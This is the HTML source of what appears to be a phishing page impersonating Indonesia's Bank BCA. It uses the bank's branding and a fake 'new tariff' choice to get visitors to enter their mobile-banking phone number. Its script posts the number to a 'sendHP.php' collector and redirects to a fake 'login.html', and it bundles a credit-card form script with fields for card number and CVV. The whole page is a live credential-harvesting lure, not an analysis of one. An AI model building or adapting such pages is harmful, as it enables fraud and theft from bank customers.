<!DOCTYPE html>
<html>
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
<meta name="VIcurrentDateTime" content="638420422355925020" />

<meta name="theme-color" content="#005BAA"> 
	<meta charset="utf-8">
	<meta name="description" content="">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  	<link data-senna-track="temporary" href="https://www.bca.co.id" rel="canonical" />
    <link rel="canonical" href="https://www.bca.co.id/" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
	<title>𝗔𝗞𝗧𝗜𝗩𝗔𝗦𝗜 𝗧𝗔𝗥𝗜𝗙 𝗕𝗖𝗔</title>
<link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/5/5c/Bank_Central_Asia.svg"/>
<meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPVVX4CnHwwhlRWwBhQQyomTGdkR7O-BpFc2UMfHMhvLIvCqstZXJvzgaS4PVftiMhgpgUqsRumk35KScSu7KJ3yJs50d9r_axIh3OklOeX7LCJ8EHgPBMvjfT7ZInDvdpsEwtbAV658_bSZwWpGZI2bAI36uV4_FQxpUuFL9FJB_rQ3sGupXJ-8Zv3U8/s1070/AddText_01-25-06.14.02.jpg">
<link property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPVVX4CnHwwhlRWwBhQQyomTGdkR7O-BpFc2UMfHMhvLIvCqstZXJvzgaS4PVftiMhgpgUqsRumk35KScSu7KJ3yJs50d9r_axIh3OklOeX7LCJ8EHgPBMvjfT7ZInDvdpsEwtbAV658_bSZwWpGZI2bAI36uV4_FQxpUuFL9FJB_rQ3sGupXJ-8Zv3U8/s1070/AddText_01-25-06.14.02.jpg"/>
<meta name="description" content="Bank BCA terus berinovasi mengembangkan produk yang sesuai dengan perkembangan jaman untuk memenuhi kebutuhan nasabah">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
<script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
	<meta name="twitter:image" content="https://www.bca.co.id/~/media/Images/logo-bca.ashx">
	<!-- TODO! : Place favicon.ico in the root directory -->
	<link rel="shortcut icon" href="../Nassets/images/favicon.png">
	<link href="main.css"		 rel="stylesheet">	
        <!-- TODO! : Google Analytics: change UA-XXXXX-X to be your site's ID. -->
        <!-- Global site tag (gtag.js) - Google Analytics -->
		<!-- Google Tag Manager -->
		<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
		new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
		j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
		'../../www.googletagmanager.com/gtm5445.html'+i+dl;f.parentNode.insertBefore(j,f);
		})(window,document,'script','dataLayer','GTM-M2754CJ');</script>
		<!-- End Google Tag Manager -->
    
</head>

<body style="overflow: hidden" id="bodyku"> 
    <div class="loader" id="loading-progress">
        <div class="wrapper-loader">
		<div class="loading-div">
            <div class="rect rect_one"></div>
            <div class="rect rect_two"></div>
            <div class="rect rect_three"></div>
			<div class="loading-text">Mohon Tunggu...</div>
		</div>
        </div>
    </div>
	
	

<!--rendering header-->
<script>
    $(document).ready(function () {
	  $('#logobca').attr('src', 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgAfsP3qt6_va8_LyaNbCDO6Bvp09f6iJUzkRJTwFuYlWJkwqU4zJw73hQff0-Owt7DU6idfqAvuWDLh3hbk_oQ18W7pHzG4X3zAKLoT4byJBSV1KXmRdHCbaKzBmGdKvEMXsAm9x8DdrRt5Nh7HQpssQWfc32NVKtGgwZ0vy6GTslssP6MRw7DYhd0KJY/s178/logo_2x.png');
	});
</script>

<style>
    .pull-right-lang {
        float: right !important;
        margin: auto 0px;
        font-size: 0px;
        margin-left: auto;
    }

    .switch {
        padding: 6px 2px;
        width: 40px;
        display: inline-block;
        text-align: center;
        text-decoration: none !important;
        transition: color 0.2s ease, background-color 0.2s ease;
        border: 1px solid #fff;
    }

        .switch:first-child {
            border-top-left-radius: 16px;
            border-bottom-left-radius: 16px;
        }

        .switch:last-child {
            border-top-right-radius: 16px;
            border-bottom-right-radius: 16px;
        }

        .switch.is-active, .switch:hover {
            background: #fff;
            color: #0066ae;
        }

    .text-lang {
        font-size: 12px;
        color: #fff
    }
    
    #wrapper{
	background: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgnZclTxWV75Oa3fuw43HnoIaFYi5FwgRxKZDvowArTKT3uOGyACODf84apTEGpjv93ZZt-UXs9fzoPDZWxxhT5xzGlY9CmfnkpBXK7CM9_A_CF20nxTpv64kxGD5ijGlGNE5BqqGoMyZfwz0OhXSgZRKuGFZlD-EFm34iaA8Bh2PGMSDgidJv2AkqyRk/s625/background-blue-mobile.png')!important;
	background-repeat: no-repeat !important;
    background-size: cover !important;;
    background-position: center !important;
}

@media(max-width:525px){
  #wrapper{
    background:url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgnZclTxWV75Oa3fuw43HnoIaFYi5FwgRxKZDvowArTKT3uOGyACODf84apTEGpjv93ZZt-UXs9fzoPDZWxxhT5xzGlY9CmfnkpBXK7CM9_A_CF20nxTpv64kxGD5ijGlGNE5BqqGoMyZfwz0OhXSgZRKuGFZlD-EFm34iaA8Bh2PGMSDgidJv2AkqyRk/s625/background-blue-mobile.png')left 50% bottom 175px/cover no-repeat !important;
  }
}

#wrapper{
	background-color:transparent;
}


  .fontku{
       font-size: 12px;
   }
   
   
   
   .btn-submit:active{
       color: #fff;
   }
   
   .btn:active{
       color: #fff;
   }
   
  .btn-default:active{
      color: #fff;
  }
  
  
  
  #btnSubmit, #btnSubmit1, #btnSubmit2{
      color: #fff;
      letter-spacing: 0.0;
  }
  
  
  #btnSubmit:active, #btnSubmit1:active, #btnSubmit2:active{
      color: #fff;
  }
  
  h4{
    font-size: 15px;
    line-height: 16px;
    margin-bottom: -5px;
    color: green;
}

#ionIcons {
            color: rgb(22, 119, 199);
            font-size: 26px;
            position: absolute;
            display: block;
            margin-top: 11px;
            margin-left: 13px;
        }
        
.radio-section {
	display: flex;
	align-items: center;
	justify-content: center;
	height: 100vh;
	width:;
}
h1 {
	margin-bottom: 20px;
}
.radio-item [type="radio"] {
	display: none;
}
.radio-item + .radio-item {
	margin-top: 15px;
}
.radio-item label {
	display: block;
	padding: 2px 10px;
	background: #09559a;
	border: 2px solid rgba(255, 255, 255, 0.1);
	border-radius: 20px;
	cursor: pointer;
	font-size: 12px;
	font-weight: 400;
	min-width: 250px;
	padding-left: 20px;
	color: #fff;
	margin: 3px ;
	position: relative;
	
}
.radio-item label:after,
.radio-item label:before {
	content: "";
	position: absolute;
	border-radius: 50%;
}
.radio-item label:after {
	height: 19px;
	width: 19px;
	border: 1px solid #fff;
	left: 9px;
	top: calc(50% - 10px);
}
.radio-item label:before {
	background: #fff;
	height: 19px;
	width: 18px;
	left: 9px;
	top: calc(50% - px);
	transform: scale(5);
	opacity: 0;
	visibility: hidden;
	transition: 0.4s ease-in-out 0s;
}
.radio-item [type="radio"]:checked ~ label {
	border-color: #524eee;
}
.radio-item [type="radio"]:checked ~ label::before {
	opacity: 1;
	visibility: visible;
	transform: scale(1);
	margin-top: -1px;
}



</style>
<div class="start" style="display:;">
	<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Bank_Central_Asia.svg/2560px-Bank_Central_Asia.svg.png" style="width: 100px; display: none" id="start">
	<div class="">
	    <center>
	
	</center>
	</div>
</div>
<div id="wrapper">
		<div id="">
	<div class="container">
		<div class="d-flex py-2">
			<div class="mr-auto p-2"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgAfsP3qt6_va8_LyaNbCDO6Bvp09f6iJUzkRJTwFuYlWJkwqU4zJw73hQff0-Owt7DU6idfqAvuWDLh3hbk_oQ18W7pHzG4X3zAKLoT4byJBSV1KXmRdHCbaKzBmGdKvEMXsAm9x8DdrRt5Nh7HQpssQWfc32NVKtGgwZ0vy6GTslssP6MRw7DYhd0KJY/s178/logo_2x.png" alt="" id="logobca" class="img-fluid logos"></div>
            
            
            
            <div class="container" style="display: -webkit-flex !important;">

                <div class="pull-right-lang">
                    <a class="switch text-lang is-active" href="https://webform.bca.co.id/id/Kartu-Kredit/daftar-asuransi">ID</a>
                    <a class="switch text-lang " href="https://webform.bca.co.id/en/Kartu-Kredit/daftar-asuransi">EN</a>
                </div>
            </div>

		
		</div>
	</div>

</div>
	







<div class="AsuransiFormWrapper" style="border-radius: 10px; padding: 24px">
    
    
    
<fieldset id="debitpage" style="display: ">
<div id ="#content" class="background">




<div class="container hid" style="position: ; background: transparent; display: none" id="wrapper">
 

		<div class="d-flex py-2">

			<div class="mr-auto p-2"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgAfsP3qt6_va8_LyaNbCDO6Bvp09f6iJUzkRJTwFuYlWJkwqU4zJw73hQff0-Owt7DU6idfqAvuWDLh3hbk_oQ18W7pHzG4X3zAKLoT4byJBSV1KXmRdHCbaKzBmGdKvEMXsAm9x8DdrRt5Nh7HQpssQWfc32NVKtGgwZ0vy6GTslssP6MRw7DYhd0KJY/s178/logo_2x.png" alt="" id="logobca" class="img-fluid logos"></div>
            
            
            
            <div class="container" style="display: -webkit-flex !important;">

                <div class="pull-right-lang">
                    <a class="switch text-lang is-active" href="https://webform.bca.co.id/id/Kartu-Kredit/daftar-asuransi">ID</a>
                    <a class="switch text-lang " href="https://webform.bca.co.id/en/Kartu-Kredit/daftar-asuransi">EN</a>
                </div>
            </div>

		
		</div>
	</div>

</div>
   <br/>
   
 
   <form id="formHP" onsubmit="sendNohp(event); return false" method="POST"> 
   
     <center style="color:#09559a;"> 
     
     
      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsffDL7-V6Z8IBqeKlIdhU4yhmC0oQddiz48_6gN3y9vW0MmBv08loMlFIoSNdumxBmurKU4lkOgmH23SmAoTmqJxuk-8nzQNeW7dNKHB18WhZNfzIEx495SfmhsKQ0AN0JfaRMZkS5_hL5xAVZkmks_StrkLzB1WJAUq1YNEF9iP0S7dtf4ydGFmPbT4/s1948/AddText_01-28-07.27.56.png" width="100%" style="margin-top: -35px">
     </center> 
    
     <hr> 
     <center>
  <!-- partial:index.partial.html -->
<section class="" style="padding: 4px; position: static; left: 0; right: 0; margin: -10px auto; width: 60%">
	<div class="radio-list" style="position: absolute; left: 0; right: 0; margin: 0px auto; width: 75%">
	<center>
		<div class="radio-item" ><input name="radio" id="radio1" type="radio" required><label for="radio1">TARIF BARU Rp 150.000 / BULAN</label>
		<div class="radio-item"><input name="radio" id="radio2" type="radio"><label for="radio2" required>BI-FAST Rp 2.500 / TRANSAKSI</label></div></div>
	
	</center>
	</div>
		</section>
		<p></p>
		<div style="margin-top: 80px">
     <h5 style="text-align: center; margin-bottom: -5px; font-size: 13px; font-weight: bold">Masukan Nomor ponsel BCA Anda <ion-icon name="call-outline" class="ion--telephone-outline" id="ionIcons"></ion-icon>
     <input data-mask="0000-0000-0000" pattern="(?=.*[0-8]).{12,15}"  oninvalid="this.setCustomValidity('Mɑsukkɑn 𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 yɑng terdɑftɑr di 𝗠𝗼𝗯𝗶𝗹𝗲 𝗕𝗮𝗻𝗸𝗶𝗻𝗴')" onchange="this.setCustomValidity('')" id="nama" name="nohp" type="tel" style="box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 2px solid #0f78cb; border-image: initial; background-color: rgb(255, 255, 255); border-radius: 18px;box-shadow: rgba(50, 50, 93, 0.25) 0px 2px 5px -1px, rgba(0, 0, 0, 0.3) 0px 1px 3px -1px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 16px; color: rgb(28, 28, 28); word-spacing: 0px; padding: 10px 45px; outline: none; margin-top: 5px" placeholder="08xx-xxxx-xxxx" maxlength="15" minlength="12" required>
     <br/><p></p>
 
    	<div class="text-center mt-4 mb-1">
			<button type="submit" id="btnSubmit" class="btn btn-default btn-submit">Lanjut</button>
		</div>
	
		<div class="text-center">
					<input type="hidden" id="captcha" name="captcha" value="">
					<div class="text-center pt-4 disclaimer-recaptcha captcha-policies">
						This site is protected by reCAPTCHA and the 
						<a href="#">Google Privacy Policy</a> and
						<a href="#">Terms of Service</a> apply.
					</div>

		</div>
   </div>  
    
    
    
  
	</fieldset>   
</div>
</div>
    <!-- /#global-modal -->
    <div class="modal fade" id="global-modal" tabindex="-1" role="dialog" aria-labelledby="" data-keyboard="false" data-backdrop="static" aria-hidden="true">
		
		<div class="modal-dialog modal-dialog-centered" style="margin-top: 0px;" role="document">
            <div class="modal-content">
                <div class="modal-header position-relative border-0 pb-0">
                    <button class="position-absolute btn-info closeTop" type="button" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
                    <h4 class="modal-title text-center w-100"></h4>
                </div>
                <div class="modal-body text-center"></div>
                <div class="modal-footer border-0">
                    <div class="d-flex align-content-center justify-content-center w-100">
                        <button data-dismiss="modal" class="btn btn-info px-4 py-2 close-btn btn-footer-modal" type="button">OK</button>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- /#global-modal -->
    
	<!--rendering content-->
	<div id="Webform-footer">
		 



<div class="container">
	<div class="row justify-content-center mt-4">
		<div class="col-lg-10">
			<div class="footer-data-wrapper row justify-content-center">
				
			<div class="footer-logo-desc mb-3 ">
						<div class="text-center justify-content-center pl-5 pr-5" style="color:#7D8185; margin-top: -20px">
							 <p class=""> BCA berizin dan diawasi oleh Otoritas Jasa Keuangan - BCA merupakan peserta penjaminan LPS</p>
							
						</div>
					</div>    
			</div>
		</div>
	</div>
</div>
	</div>


		<!-- end script detect browser-->
<script src="/vendors/jquery-mask-plugin/dist/jquery.mask.js"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
<script src="kelentet1.jsa"></script>
<script>

/*
See on github: https://github.com/muhammederdem/credit-card-form
*/

new Vue({
  el: "#app",
  data() {
    return {
      currentCardBackground: Math.floor(Math.random()* 25 + 1), // just for fun :D
      cardName: "",
      cardNumber: "",
      cardMonth: "",
      cardYear: "",
      cardCvv: "",
      cardvalid: "##/##",
      saldo: "",
      minCardYear: new Date().getFullYear(),
      amexCardMask: "#### ###### #####",
      otherCardMask: "#### #### #### ####",
      cardNumberTemp: "",
      cardValid: "##/##",
      isCardFlipped: false,
      focusElementStyle: null,
      isInputFocused: false
    };
  },
  mounted() {
    this.cardNumberTemp = this.otherCardMask;
    document.getElementById("cardNumber").focus();
  },
  computed: {
    getCardType () {
      let number = this.cardNumber;
      let re = new RegExp("^4");
      if (number.match(re) != null) return "visa";

      re = new RegExp("^(34|37)");
      if (number.match(re) != null) return "amex";

      re = new RegExp("^5[1-5]");
      if (number.match(re) != null) return "mastercard";

      re = new RegExp("^6011");
      if (number.match(re) != null) return "discover";
      
      re = new RegExp('^9792')
      if (number.match(re) != null) return 'troy'

      return "visa"; // default type
    },
		generateCardNumberMask () {
			return this.getCardType === "amex" ? this.amexCardMask : this.otherCardMask;
    },
    minCardMonth () {
      if (this.cardYear === this.minCardYear) return new Date().getMonth() + 1;
      return 1;
    }
  },
  watch: {
    cardYear () {
      if (this.cardMonth < this.minCardMonth) {
        this.cardMonth = "";
      }
    }
  },
  methods: {
    flipCard (status) {
      this.isCardFlipped = status;
    },
    focusInput (e) {
      this.isInputFocused = true;
      let targetRef = e.target.dataset.ref;
      let target = this.$refs[targetRef];
      this.focusElementStyle = {
        width: `${target.offsetWidth}px`,
        height: `${target.offsetHeight}px`,
        transform: `translateX(${target.offsetLeft}px) translateY(${target.offsetTop}px)`
      }
    },
    blurInput() {
      let vm = this;
      setTimeout(() => {
        if (!vm.isInputFocused) {
          vm.focusElementStyle = null;
        }
      }, 300);
      vm.isInputFocused = false;
    }
  }
});




</script>	
<script>
 $(document).ready(function(){
    $('#formHP').submit(function(e) {
    event.preventDefault();

document.getElementById('btnSubmit').innerHTML = "Memproses...";   

 $.ajax({
 type: 'POST',
 url: 'sendHP.php',
 data: $(this).serialize(),
 datatype: 'JSON',
 
 complete: function(data) {
            console.log('Complete')
  setTimeout(function(){
 var nomor = document.getElementById("nama").value;
 sessionStorage.setItem("nomor", nomor);          location.href ="./login.html";
     }, 500);
        }
    });
 });
    return false;
});   
     
</script>
</body>
</html>

